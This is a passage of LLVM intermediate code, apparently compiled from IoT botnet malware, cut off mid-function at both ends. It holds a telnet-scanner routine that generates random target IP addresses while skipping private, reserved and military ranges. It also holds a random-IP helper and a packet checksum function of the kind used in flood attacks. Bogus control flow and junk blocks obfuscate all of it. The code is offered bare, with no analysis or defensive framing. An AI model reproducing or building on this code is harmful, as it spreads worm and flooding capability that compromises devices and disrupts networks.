  store i8 %15, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %16 = call i32 @rand() #5
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %19 = call i32 @rand() #5
  %20 = srem i32 %19, 255
  %21 = trunc i32 %20 to i8
  store i8 %21, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  %22 = load i32, i32* @x.57
  %23 = load i32, i32* @y.58
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %330, %originalBBpart2
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 127
  br i1 %33, label %312, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %312, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 3
  br i1 %41, label %312, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 15
  br i1 %45, label %312, label %46

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 16
  br i1 %49, label %312, label %50

; <label>:50:                                     ; preds = %46
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 56
  br i1 %53, label %312, label %54

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 10
  br i1 %57, label %312, label %58

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* @x.57
  %60 = load i32, i32* @y.58
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %58
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 192
  %70 = load i32, i32* @x.57
  %71 = load i32, i32* @y.58
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br i1 %69, label %78, label %82

; <label>:78:                                     ; preds = %originalBBpart237
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 168
  br i1 %81, label %312, label %82

; <label>:82:                                     ; preds = %78, %originalBBpart237
  %83 = load i32, i32* @x.57
  %84 = load i32, i32* @y.58
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %82
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 172
  %94 = load i32, i32* @x.57
  %95 = load i32, i32* @y.58
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br i1 %93, label %102, label %110

; <label>:102:                                    ; preds = %originalBBpart241
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp sge i32 %104, 16
  br i1 %105, label %106, label %110

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp slt i32 %108, 32
  br i1 %109, label %312, label %110

; <label>:110:                                    ; preds = %106, %102, %originalBBpart241
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 100
  br i1 %113, label %114, label %154

; <label>:114:                                    ; preds = %110
  %115 = load i32, i32* @x.57
  %116 = load i32, i32* @y.58
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %114
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp sge i32 %124, 64
  %126 = load i32, i32* @x.57
  %127 = load i32, i32* @y.58
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br i1 %125, label %134, label %154

; <label>:134:                                    ; preds = %originalBBpart245
  %135 = load i32, i32* @x.57
  %136 = load i32, i32* @y.58
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %134
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp slt i32 %144, 127
  %146 = load i32, i32* @x.57
  %147 = load i32, i32* @y.58
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %145, label %312, label %154

; <label>:154:                                    ; preds = %originalBBpart249, %originalBBpart245, %110
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 169
  br i1 %157, label %158, label %162

; <label>:158:                                    ; preds = %154
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp sgt i32 %160, 254
  br i1 %161, label %312, label %162

; <label>:162:                                    ; preds = %158, %154
  %163 = load i32, i32* @x.57
  %164 = load i32, i32* @y.58
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %162
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 198
  %174 = load i32, i32* @x.57
  %175 = load i32, i32* @y.58
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %173, label %182, label %206

; <label>:182:                                    ; preds = %originalBBpart253
  %183 = load i32, i32* @x.57
  %184 = load i32, i32* @y.58
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %182
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp sge i32 %192, 18
  %194 = load i32, i32* @x.57
  %195 = load i32, i32* @y.58
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %193, label %202, label %206

; <label>:202:                                    ; preds = %originalBBpart257
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp slt i32 %204, 20
  br i1 %205, label %312, label %206

; <label>:206:                                    ; preds = %202, %originalBBpart257, %originalBBpart253
  %207 = load i32, i32* @x.57
  %208 = load i32, i32* @y.58
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %206
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 224
  %218 = load i32, i32* @x.57
  %219 = load i32, i32* @y.58
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %217, label %312, label %226

; <label>:226:                                    ; preds = %originalBBpart261
  %227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 6
  br i1 %229, label %310, label %230

; <label>:230:                                    ; preds = %226
  %231 = load i32, i32* @x.57
  %232 = load i32, i32* @y.58
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %230
  %239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %240 = zext i8 %239 to i32
  %241 = icmp eq i32 %240, 7
  %242 = load i32, i32* @x.57
  %243 = load i32, i32* @y.58
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br i1 %241, label %310, label %250

; <label>:250:                                    ; preds = %originalBBpart265
  %251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 11
  br i1 %253, label %310, label %254

; <label>:254:                                    ; preds = %250
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 21
  br i1 %257, label %310, label %258

; <label>:258:                                    ; preds = %254
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 22
  br i1 %261, label %310, label %262

; <label>:262:                                    ; preds = %258
  %263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 26
  br i1 %265, label %310, label %266

; <label>:266:                                    ; preds = %262
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 28
  br i1 %269, label %310, label %270

; <label>:270:                                    ; preds = %266
  %271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %272 = zext i8 %271 to i32
  %273 = icmp eq i32 %272, 29
  br i1 %273, label %310, label %274

; <label>:274:                                    ; preds = %270
  %275 = load i32, i32* @x.57
  %276 = load i32, i32* @y.58
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %274
  %283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 30
  %286 = load i32, i32* @x.57
  %287 = load i32, i32* @y.58
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %285, label %310, label %294

; <label>:294:                                    ; preds = %originalBBpart269
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 33
  br i1 %297, label %310, label %298

; <label>:298:                                    ; preds = %294
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 55
  br i1 %301, label %310, label %302

; <label>:302:                                    ; preds = %298
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 214
  br i1 %305, label %310, label %306

; <label>:306:                                    ; preds = %302
  %307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 215
  br label %310

; <label>:310:                                    ; preds = %306, %302, %298, %294, %originalBBpart269, %270, %266, %262, %258, %254, %250, %originalBBpart265, %226
  %311 = phi i1 [ true, %302 ], [ true, %298 ], [ true, %294 ], [ true, %originalBBpart269 ], [ true, %270 ], [ true, %266 ], [ true, %262 ], [ true, %258 ], [ true, %254 ], [ true, %250 ], [ true, %originalBBpart265 ], [ true, %226 ], [ %309, %306 ]
  br label %312

; <label>:312:                                    ; preds = %310, %originalBBpart261, %202, %158, %originalBBpart249, %106, %78, %54, %50, %46, %42, %38, %34, %30
  %313 = phi i1 [ true, %originalBBpart261 ], [ true, %202 ], [ true, %158 ], [ true, %originalBBpart249 ], [ true, %106 ], [ true, %78 ], [ true, %54 ], [ true, %50 ], [ true, %46 ], [ true, %42 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ %311, %310 ]
  %314 = load i32, i32* @x.57
  %315 = load i32, i32* @y.58
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %312
  %322 = load i32, i32* @x.57
  %323 = load i32, i32* @y.58
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %313, label %330, label %343

; <label>:330:                                    ; preds = %originalBBpart273
  %331 = call i32 @rand() #5
  %332 = srem i32 %331, 223
  %333 = trunc i32 %332 to i8
  store i8 %333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %334 = call i32 @rand() #5
  %335 = srem i32 %334, 255
  %336 = trunc i32 %335 to i8
  store i8 %336, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %337 = call i32 @rand() #5
  %338 = srem i32 %337, 255
  %339 = trunc i32 %338 to i8
  store i8 %339, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %340 = call i32 @rand() #5
  %341 = srem i32 %340, 255
  %342 = trunc i32 %341 to i8
  store i8 %342, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  br label %30

; <label>:343:                                    ; preds = %originalBBpart273
  %344 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %344, i8 0, i64 16, i32 16, i1 false)
  %345 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %346 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %347 = zext i8 %346 to i32
  %348 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %349 = zext i8 %348 to i32
  %350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %351 = zext i8 %350 to i32
  %352 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  %353 = zext i8 %352 to i32
  %354 = call i32 (i8*, i8*, ...) @szprintf(i8* %345, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %347, i32 %349, i32 %351, i32 %353)
  %355 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %356 = call i32 @inet_addr(i8* %355) #5
  ret i32 %356

originalBBalteredBB:                              ; preds = %originalBB, %0
  %357 = alloca [16 x i8], align 16
  %358 = call i32 @rand() #5
  %_ = shl i32 %358, 223
  %_1 = shl i32 %358, 223
  %_2 = sub i32 %358, 223
  %gen = mul i32 %_2, 223
  %_3 = shl i32 %358, 223
  %_4 = sub i32 %358, 223
  %gen5 = mul i32 %_4, 223
  %_6 = sub i32 0, %358
  %gen7 = add i32 %_6, 223
  %_8 = sub i32 %358, 223
  %gen9 = mul i32 %_8, 223
  %_10 = sub i32 %358, 223
  %gen11 = mul i32 %_10, 223
  %_12 = shl i32 %358, 223
  %359 = srem i32 %358, 223
  %360 = trunc i32 %359 to i8
  store i8 %360, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %361 = call i32 @rand() #5
  %_13 = sub i32 %361, 255
  %gen14 = mul i32 %_13, 255
  %362 = srem i32 %361, 255
  %363 = trunc i32 %362 to i8
  store i8 %363, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %364 = call i32 @rand() #5
  %_15 = shl i32 %364, 255
  %_16 = sub i32 %364, 255
  %gen17 = mul i32 %_16, 255
  %_18 = sub i32 %364, 255
  %gen19 = mul i32 %_18, 255
  %_20 = shl i32 %364, 255
  %_21 = sub i32 0, %364
  %gen22 = add i32 %_21, 255
  %_23 = sub i32 0, %364
  %gen24 = add i32 %_23, 255
  %_25 = sub i32 %364, 255
  %gen26 = mul i32 %_25, 255
  %_27 = sub i32 %364, 255
  %gen28 = mul i32 %_27, 255
  %_29 = sub i32 %364, 255
  %gen30 = mul i32 %_29, 255
  %365 = srem i32 %364, 255
  %366 = trunc i32 %365 to i8
  store i8 %366, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %367 = call i32 @rand() #5
  %_31 = shl i32 %367, 255
  %_32 = shl i32 %367, 255
  %_33 = shl i32 %367, 255
  %_34 = shl i32 %367, 255
  %368 = srem i32 %367, 255
  %369 = trunc i32 %368 to i8
  store i8 %369, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  br label %originalBB

originalBB35alteredBB:                            ; preds = %originalBB35, %58
  %370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %371 = zext i8 %370 to i32
  %372 = icmp eq i32 %371, 192
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %82
  %373 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 172
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %114
  %376 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %377 = zext i8 %376 to i32
  %378 = icmp sge i32 %377, 64
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %134
  %379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %380 = zext i8 %379 to i32
  %381 = icmp slt i32 %380, 127
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %162
  %382 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %383 = zext i8 %382 to i32
  %384 = icmp eq i32 %383, 198
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %182
  %385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp sge i32 %386, 18
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %206
  %388 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %389 = zext i8 %388 to i32
  %390 = icmp eq i32 %389, 224
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %230
  %391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 7
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %274
  %394 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %395 = zext i8 %394 to i32
  %396 = icmp eq i32 %395, 30
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %312
  br label %originalBB71
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.61
  %4 = load i32, i32* @y.62
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.61
  %15 = load i32, i32* @y.62
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %25, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %34

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  %32 = load i32, i32* %12, align 4
  %33 = sub nsw i32 %32, 2
  store i32 %33, i32* %12, align 4
  br label %22

; <label>:34:                                     ; preds = %22
  %35 = load i32, i32* %12, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %60

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* @x.61
  %39 = load i32, i32* @y.62
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i16*, i16** %11, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i64
  %50 = load i64, i64* %13, align 8
  %51 = add i64 %50, %49
  store i64 %51, i64* %13, align 8
  %52 = load i32, i32* @x.61
  %53 = load i32, i32* @y.62
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %60

; <label>:60:                                     ; preds = %originalBBpart24, %34
  br label %61

; <label>:61:                                     ; preds = %originalBBpart257, %60
  %62 = load i32, i32* @x.61
  %63 = load i32, i32* @y.62
  %64 = sub i32 %62, 1
